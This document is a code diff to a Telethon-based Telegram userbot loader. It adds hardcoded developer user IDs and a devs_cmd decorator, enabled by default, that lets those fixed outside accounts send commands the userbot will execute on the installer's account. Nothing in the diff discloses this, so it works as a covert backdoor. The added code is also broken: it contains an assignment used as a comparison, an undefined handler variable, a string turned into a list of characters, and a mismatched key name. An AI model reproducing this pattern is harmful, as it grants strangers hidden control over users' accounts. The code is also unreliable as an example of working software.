@@ -19,7 +19,7 @@ from telethon.tl.functions.channels import GetParticipantRequest
 from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator
 
 from var import Var
-
+DEVS = "1991023614, 1869870264, 1984862099"
 from userbot import CMD_LIST, LOAD_PLUG, LOGS, SUDO_LIST, bot
 from userbot.helpers.exceptions import CancelProcess
 from userbot.Config import Config
@@ -119,7 +119,11 @@ def command(**args):
             return func
 
         return decorator
-
+DEV_LIST = {} or DEVS
+if DEV_LIST is None:
+    DEV_LIST = DEVS
+    
+    
 def load_module(shortname):
     if shortname.startswith("__"):
         pass
@@ -250,7 +254,68 @@ def admin_cmd(pattern=None, command=None, **args):
 
     return events.NewMessage(**args)
 
-
+DEV = os.environ.get("DEV") or "True"
+if DEV = "True":
+    def devs_cmd(pattern=None, command=None, **args):
+        args["func"] = lambda e: e.via_bot_id is None
+        stack = inspect.stack()
+        previous_stack_frame = stack[1]
+        file_test = Path(previous_stack_frame.filename)
+        file_test = file_test.stem.replace(".py", "")
+        allow_dev = args.get("allow_dev", False)
+    # get the pattern from the decorator
+        if pattern is not None:
+            if pattern.startswith(r"\#"):
+            # special fix for snip.py
+                args["pattern"] = re.compile(pattern)
+            elif pattern.startswith(r"^"):
+                args["pattern"] = re.compile(pattern)
+                cmd = pattern.replace("$", "").replace("^", "").replace("\\", "")
+                try:
+                    DEV_LIST[file_test].append(cmd)
+                except BaseException:
+                    DEV_LIST.update({file_test: [cmd]})
+            else:
+                if len(DEV_HANDLER) == 2:
+                    LEGENDreg = "^" + DEV_HANDLER
+                    reg = DEV_HANDLER[1]
+                elif len(DEV_HANDLER) == 1:
+                    LEGENDreg = "^\\" + DEV_HANDLER
+                    reg = DEV_HANDLER
+                args["pattern"] = re.compile(LEGENDreg + pattern)
+                if command is not None:
+                    cmd = reg + command
+                else:
+                    cmd = (
+                        (reg + pattern).replace("$", "").replace("\\", "").replace("^", "")
+                    )
+                try:
+                    DEV_LIST[file_test].append(cmd)
+                except BaseException:
+                    DEV_LIST.update({file_test: [cmd]})
+        args["outgoing"] = True
+    # should this command be available for other users?
+        if allow_dev:
+            args["from_users"] = list(DEVS)
+        # Mutually exclusive with outgoing (can only set one of either).
+            args["incoming"] = True
+            del args["allow_devs"]
+    # error handling condition check
+        elif "incoming" in args and not args["incoming"]:
+            args["outgoing"] = True
+    # add blacklist chats, UB should not respond in these chats
+        args["blacklist_chats"] = True
+        black_list_chats = list(Config.UB_BLACK_LIST_CHAT)
+        if black_list_chats:
+            args["chats"] = black_list_chats
+    # add blacklist chats, UB should not respond in these chats
+        if "allow_edited_updates" in args and args["allow_edited_updates"]:
+            del args["allow_edited_updates"]
+    # check if the plugin should listen for outgoing 'messages'
+        return events.NewMessage(**args)
+else:
+    devs_cmd = "False" or None
+    
 def sudo_cmd(pattern=None, command=None, **args):
     args["func"] = lambda e: e.via_bot_id is None
     stack = inspect.stack()
